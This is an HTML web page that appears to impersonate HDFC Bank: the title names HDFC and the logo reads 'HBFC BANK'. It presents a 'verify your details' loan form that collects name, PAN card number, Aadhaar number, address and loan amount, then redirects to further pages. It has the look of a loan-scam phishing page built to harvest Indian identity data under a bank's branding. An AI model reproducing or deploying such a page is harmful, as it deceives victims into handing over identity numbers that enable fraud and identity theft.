<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC Bank - Verify Details</title>
    <style>
        :root {
            --hdfc-blue: #004c8f;
            --hdfc-red: #ed1c24;
        }
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background-color: #f5f5f5;
        }
        /* Header Design */
        .header {
            background-color: var(--hbfc-blue);
            color: white;
            padding: 20px;
            border-bottom-left-radius: 50px;
            position: relative;
        }
        .logo-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo {
            background: white;
            padding: 5px 10px;
            font-weight: bold;
            color: var(--hbfc-blue);
            border: 1px solid white;
        }
        .progress-container {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .circle-num {
            border: 1px solid white;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        /* Form Section */
        .form-container {
            background: white;
            padding: 25px;
            margin-top: -20px;
            border-top-left-radius: 30px;
        }
        h2 { font-size: 22px; color: #333; margin-bottom: 10px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; color: #666; font-size: 14px; margin-bottom: 8px; }
        
        input, select {
            width: 100%;
            border: none;
            border-bottom: 1px solid #ccc;
            padding: 10px 0;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }

        /* Error logic */
        .error-border {
            border: 2px solid var(--hbfc-red) !important;
            border-radius: 4px;
            padding: 10px !important;
        }

        .gender-options { display: flex; gap: 15px; margin-top: 10px; }
        .gender-options label { display: flex; align-items: center; gap: 5px; }

        .amount-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .amount-wrapper::before {
            content: "₹";
            position: absolute;
            left: 0;
            font-size: 18px;
        }
        .amount-wrapper input { padding-left: 20px; }

        .btn-apply {
            background-color: var(--hbfc-blue);
            color: white;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo-row">
            <div class="logo">HBFC BANK</div>
            <div style="font-size: 12px;">? Help</div>
        </div>
        <div class="progress-container">
            <div class="circle-num">01</div>
            <div>
                <div style="font-size: 18px;">Please verify your details</div>
            </div>
            <div style="margin-left: auto; text-align: center;">
                <div style="font-size: 10px;">50% complete</div>
            </div>
        </div>
    </div>

    <div class="form-container">
        <h2>Welcome, Please share your details</h2>

        <div class="input-group">
            <label>Enter your full name</label>
            <input type="text" id="firstName" placeholder="First Name" required>
            <input type="text" id="lastName" placeholder="Last Name" required>
        </div>

        <div class="input-group">
            <label>Select your gender</label>
            <div class="gender-options">
                <label><input type="radio" name="gender" value="male"> Male</label>
                <label><input type="radio" name="gender" value="female"> Female</label>
                <label><input type="radio" name="gender" value="neutral"> Gender Neutral</label>
            </div>
        </div>

        <div class="input-group">
            <label>Your PAN card number</label>
            <input type="text" id="panCard" placeholder="Enter PAN card number" maxlength="10">
        </div>

        <div class="input-group">
            <label>Enter Aadhaar Number</label>
            <input type="number" id="aadharCard" placeholder="Enter Aadhaar number" oninput="if(this.value.length>12)this.value=this.value.slice(0,12)">
        </div>

        <div class="input-group">
            <label>Address Details</label>
            <input type="text" id="addr1" placeholder="Address line 1" style="margin-bottom: 10px;">
            <input type="text" id="addr2" placeholder="Address line 2">
        </div>

        <div class="input-group">
            <label>Area PIN Code</label>
            <input type="number" id="pincode" placeholder="6 Digit PIN Code">
        </div>

        <div class="input-group">
            <label>Select Loan Type</label>
            <select id="loanType">
                <option value="">-- Choose Option --</option>
                <option value="personal">Personal Loan</option>
                <option value="document">Document Loan</option>
            </select>
        </div>

        <div class="input-group">
            <label>How much loan do you need?</label>
            <div class="amount-wrapper">
                <input type="number" id="loanAmount" placeholder="Enter Amount">
            </div>
        </div>

        <button class="btn-apply" onclick="validateForm()">APPLY NOW</button>
    </div>

    <script>
        function validateForm() {
            let isValid = true;
            const fields = ['firstName', 'lastName', 'panCard', 'aadharCard', 'addr1', 'pincode', 'loanType', 'loanAmount'];
            
            // Error border hatana
            fields.forEach(id => document.getElementById(id).classList.remove('error-border'));

            // Basic Empty Check
            fields.forEach(id => {
                const el = document.getElementById(id);
                if (!el.value || el.value.trim() === "") {
                    el.classList.add('error-border');
                    isValid = false;
                }
            });

            // PAN aur Aadhaar ki length check
            const pan = document.getElementById('panCard').value;
            const aadhar = document.getElementById('aadharCard').value;

            if(pan.length < 10) {
                document.getElementById('panCard').classList.add('error-border');
                isValid = false;
            }
            if(aadhar.length < 12) {
                document.getElementById('aadharCard').classList.add('error-border');
                isValid = false;
            }

            if (!isValid) {
                // Phone vibrate hoga popup nahi aayega
                if (navigator.vibrate) {
                    navigator.vibrate([200, 100, 200]);
                }
            } else {
                // Success: Amount save karein
                const amount = document.getElementById('loanAmount').value;
                localStorage.setItem('userLoanAmount', amount);

                // Loan type ke hisaab se redirect karein
                const selectedLoan = document.getElementById('loanType').value;
                if (selectedLoan === "personal") {
                    window.location.href = "enter2.html";
                } else if (selectedLoan === "document") {
                    window.location.href = "doc1.html";
                }
            }
        }
    </script>
</body>
</html>
